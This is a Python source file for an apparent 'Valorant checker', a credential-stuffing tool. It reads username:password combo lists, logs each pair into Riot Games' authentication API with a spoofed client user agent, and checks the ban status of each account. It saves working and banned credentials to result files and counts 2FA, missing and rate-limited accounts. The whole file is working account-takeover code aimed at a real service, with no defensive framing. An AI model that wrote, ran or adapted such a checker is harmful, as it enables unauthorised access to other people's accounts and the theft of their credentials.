from colorama import Fore, init
from urllib import request
from requests import session as sesh
from requests.adapters import HTTPAdapter
from ssl import PROTOCOL_TLSv1_2
from urllib3 import PoolManager
from tkinter import *
from collections import OrderedDict
from re import compile
import pandas
import requests
import time
from tkinter import filedialog, messagebox
import tkinter
import os
root = tkinter.Tk()
root.withdraw()

init(convert=True)

checked = 0
good = 0
timeban = 0
perban = 0
notexist = 0
rate = 0
verified = 0
unverified = 0
xds = []

class TLSAdapter(HTTPAdapter):
    def init_poolmanager(self, connections, maxsize, block=False):
        self.poolmanager = PoolManager(num_pools=connections, maxsize=maxsize, block=block,
                                       ssl_version=PROTOCOL_TLSv1_2)
def center(var:str, space:int=None): # From Pycenter
    if not space:
        space = (os.get_terminal_size().columns - len(var.splitlines()[int(len(var.splitlines())/2)])) / 2
    return "\n".join((' ' * int(space)) + var for var in var.splitlines())
def checker():
    global good, timeban, perban, notexist, rate, checked, verified, unverified, _2FA
    print("       Github.com/xharky")
    print("         [1] Static")
    print("         [2] Dynamik")

    choice = input("[>] ")
    choice = int(choice)
    file1 = open('combo.txt', 'r')
    lines = file1.readlines()
    with open("combo.txt", 'r+', encoding='utf-8') as e:
        ext = e.readlines()
        for line in ext:
            xd = line.split(":")[0].replace('\n', '')
            xds.append(xd)
    num = len(xds)
    for line in lines:
        username = line.split(":")[0].replace('\n', '')
        password = line.split(":")[1].replace('\n', '')
        os.system(f"title Valorant checker Good: {good} Timebanned: {timeban} Permbanned: {perban} Not exist: {notexist} Ratelimited: {rate}")
        if choice == 1:
            os.system("cls")
            print("")
            print(center(f"Accounts: {Fore.LIGHTGREEN_EX}{num}{Fore.RESET} "))
            print(center(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"))
            print(center(f"Checked:            [{Fore.YELLOW}{checked}/{num}{Fore.WHITE}]"))
            print(center(f"Good:               [{Fore.GREEN}{good}{Fore.WHITE}]"))
            print(center(f"Timeban:            [{Fore.RED}{timeban}{Fore.WHITE}]"))
            print(center(f"Permban:            [{Fore.RED}{perban}{Fore.WHITE}]"))
            print(center(f"Not exist:          [{Fore.RED}{notexist}{Fore.WHITE}]"))
            print(center(f"Ratelimit           [{Fore.YELLOW}{rate}{Fore.WHITE}]"))
            print(center(f" ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"))
        headers = OrderedDict({
            "Accept-Language": "en-US,en;q=0.9",
            "Accept": "application/json, text/plain, */*",
            'User-Agent': 'RiotClient/51.0.0.4429735.4381201 rso-auth (Windows;10;;Professional, x64)'
        })
        session = sesh()
        session.headers = headers
        session.mount('https://', TLSAdapter())
        data = {
            "acr_values": "urn:riot:bronze",
            "claims": "",
            "client_id": "riot-client",
            "nonce": "oYnVwCSrlS5IHKh7iI16oQ",
            "redirect_uri": "http://localhost/redirect",
            "response_type": "token id_token",
            "scope": "openid link ban lol_region",
        }
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'RiotClient/51.0.0.4429735.4381201 rso-auth (Windows;10;;Professional, x64)',
        }
        r = session.post(f'https://auth.riotgames.com/api/v1/authorization', json=data, headers=headers)
        data = {
            'type': 'auth',
            'username': username,
            'password': password
        }
        r2 = session.put('https://auth.riotgames.com/api/v1/authorization', json=data, headers=headers)
        data = r2.json()
        if "access_token" in r2.text:
            pattern = compile(
                'access_token=((?:[a-zA-Z]|\d|\.|-|_)*).*id_token=((?:[a-zA-Z]|\d|\.|-|_)*).*expires_in=(\d*)')
            data = pattern.findall(data['response']['parameters']['uri'])[0]
            token = data[0]
            checked += 1
        elif "auth_failure" in r2.text:
            if choice == 2:
                print(f"{Fore.RED}[Not exist]{Fore.RESET} {username}:{password}")
            notexist += 1
            checked += 1
            continue
        elif "rate_limited" in r2.text:
            if choice == 2:
                print(f"{Fore.YELLOW}[Ratelimited]{Fore.RESET}")
            rate += 1
            checked += 1
            time.sleep(2)
            continue
        else:
            if choice == 2:
                print(f"{Fore.BLUE}[2FA]{Fore.RESET} {username}:{password}")
            checked += 1
            continue
        headers = {
            'User-Agent': 'RiotClient/51.0.0.4429735.4381201 rso-auth (Windows;10;;Professional, x64)',
            'Authorization': f'Bearer {token}',
        }
        r = session.post('https://auth.riotgames.com/userinfo', headers=headers, json={})
        data = r.json()
        data1 = data['acct']
        unix_time = data1['created_at']
        unix_time = int(unix_time)
        result_s = pandas.to_datetime(unix_time,unit='ms')
        str(result_s)
        typebanned = None
        result_s1 = None
        try:
            data = r.json()
            data2 = data['ban']
            data3 = data2['restrictions']
            for x in data3:
                typebanned = x['type']
            if typebanned == "PERMANENT_BAN":
                result_s1 = "Permantent"
                bannedtxt = open("results//ban.txt", "a+")
                bannedtxt.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Banntype: {typebanned}\n| Expire {result_s1}\n| Creattion: {result_s}\n|[-------------------------------------]\n\n")
                bannedtxt.close()
                if choice == 2:
                    print(f"{Fore.RED}[Banned]{Fore.RESET} {username}:{password} Type: {typebanned}")
                perban += 1
                continue
            elif typebanned == "TIME_BAN":
                for y in data3:
                    lol = y['dat']
                exeperationdate = lol['expirationMillis']
                unix_time1 = exeperationdate
                unix_time1 = int(unix_time1)
                result_s1 = pandas.to_datetime(unix_time1,unit='ms')
                str(result_s1)
                bannedtxt1 = open("results//ban.txt", "a+")
                bannedtxt1.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Banntype: {typebanned}\n| Expire {result_s1}\n| Creattion: {result_s}\n|[-------------------------------------]\n\n")
                bannedtxt1.close()
                if choice == 2:
                    print(f"{Fore.RED}[Banned]{Fore.RESET} {username}:{password} Type: {typebanned}")
                timeban += 1
                continue
            elif typebanned == None:
                typebanned = "Unbanned"
                bannedtxt12 = open("results//good.txt", "a+")
                bannedtxt12.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Banntype: {typebanned}\n| Expire {result_s1}\n| Creattion: {result_s}\n|[-------------------------------------]\n\n")
                bannedtxt12.close()
                if choice == 2:
                    print(f"{Fore.GREEN}[Good]{Fore.RESET} {username}:{password} Type: {typebanned}")
                good += 1
                continue
        except:
            if choice == 2:
                print(f"{Fore.BLUE}[2FA]{Fore.RESET} {username}:{password} Type: {typebanned}")
            return

checker()